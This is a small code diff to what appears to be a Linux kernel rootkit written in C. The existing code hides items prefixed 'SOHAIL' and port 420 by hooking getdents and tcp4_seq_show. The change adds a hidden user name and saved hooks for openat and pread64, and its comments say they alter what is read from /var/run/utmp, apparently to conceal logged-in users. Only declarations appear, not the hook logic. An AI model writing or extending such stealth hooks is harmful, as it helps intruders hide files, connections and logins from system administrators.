@@ -6,6 +6,7 @@
 
 #define PREFIX "SOHAIL"
 #define PORT 420
+#define USER "sohail"
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
@@ -27,6 +28,12 @@ typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
 static ptregs_t orig_getdents;
 /* hiding ports*/
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+/* openat to see when the file /var/run/utmp is opened */
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
+static ptregs_t orig_openat;
+/* pread 64 inorder to change what the user reads */
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
+static ptregs_t orig_pread64;
 
 #else
 /* kill */
